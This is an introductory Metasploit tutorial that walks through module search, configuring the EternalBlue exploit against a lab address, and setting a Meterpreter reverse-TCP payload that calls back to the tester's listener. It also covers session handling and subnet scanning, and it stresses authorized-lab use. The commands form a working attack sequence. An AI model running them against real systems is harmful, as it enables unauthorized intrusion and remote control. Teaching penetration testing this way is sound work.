# Metasploit Basics

The Metasploit Framework is the most widely used platform for developing, testing, and running exploits in a controlled way. It's a core tool in penetration testing labs and certifications.

> **Legal notice:** Only use Metasploit against systems you own or have explicit written permission to test — such as your own lab VMs or an authorized engagement. Unauthorized exploitation is illegal in many jurisdictions.

---

## 1. Starting Metasploit

Launch the console:

```bash
msfconsole
```

Check that the database is connected (used to store hosts, services, and results):

```bash
db_status
```

---

## 2. Searching for Modules

Metasploit organizes modules into types: exploits, auxiliary, payloads, encoders, and post-exploitation modules.

```bash
search type:exploit platform:windows smb
search cve:2021 type:exploit
```

Each result shows a module path, disclosure date, rank (reliability), and a short description.

---

## 3. Selecting and Configuring a Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
```

`show options` lists required settings — typically `RHOSTS` (target), `RPORT` (target port), and `LHOST` (your listening address for the payload's callback).

```bash
set RHOSTS 192.168.56.10
set LHOST 192.168.56.5
```

---

## 4. Payloads

A payload is the code that actually runs on the target after successful exploitation.

```bash
show payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

- **Staged payloads** — send a small stager first, which then pulls down the rest
- **Stageless payloads** — send the whole payload in one piece (more reliable on some networks, larger footprint)
- **Meterpreter** — an advanced, in-memory payload offering file system access, process control, and pivoting once a session is established

---

## 5. Running the Module

```bash
exploit
```

or, for non-exploit modules:

```bash
run
```

**Manage active sessions:**

```bash
sessions -l          # List active sessions
sessions -i 1         # Interact with session 1
```

---

## 6. Auxiliary & Scanner Modules

Not every module is an exploit — many are scanners or utilities useful during reconnaissance.

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.56.0/24
run
```

**Import Nmap results directly into Metasploit's database:**

```bash
db_nmap -sV 192.168.56.0/24
```

---

## 7. Workspaces

Workspaces keep engagement data organized and separated.

```bash
workspace -a client-a-pentest
workspace client-a-pentest
hosts
services
```

---

## Key Takeaways

- Metasploit follows a consistent pattern: `search` → `use` → `set options` → `exploit`/`run`
- Payloads determine what happens after successful exploitation — Meterpreter is the most feature-rich
- Auxiliary modules (scanners, fuzzers) are just as valuable as exploits for reconnaissance
- Always work inside an authorized lab — practice on intentionally vulnerable VMs, never live systems without permission

---

*Next: Explore Python for Security Scripting to start automating your own recon and reporting tools.*
